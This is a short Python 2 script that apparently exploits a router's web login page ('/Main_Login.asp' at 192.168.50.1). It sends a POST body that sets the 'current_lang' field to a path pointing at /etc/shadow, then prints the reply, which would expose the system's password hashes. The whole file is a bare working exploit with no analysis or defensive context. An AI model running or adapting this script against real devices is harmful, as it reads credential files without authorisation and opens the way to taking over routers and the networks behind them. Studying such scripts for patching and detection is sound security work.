# -*- coding:UTF-8 -*-
#!/usr/bin/env python2
import requests

IP='192.168.50.1'
datas ='{current_lang=/////etc/shadow}'
length = len(datas)

headers = requests.utils.default_headers()
headers["Content-Length"]=str(length)
headers["Connection"] = "keep-alive"
headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:82.0) Gecko/20100101 Firefox/82.0"
headers["Content-Type"] = "application/x-www-form-urlencoded"
headers["Accept"]="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
headers["Accept-Encoding"]="gzip, deflate"
headers["Accept-Language"]="zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"


r = requests.post('http://'+IP+'/Main_Login.asp', headers=headers, data=datas)
print r.text

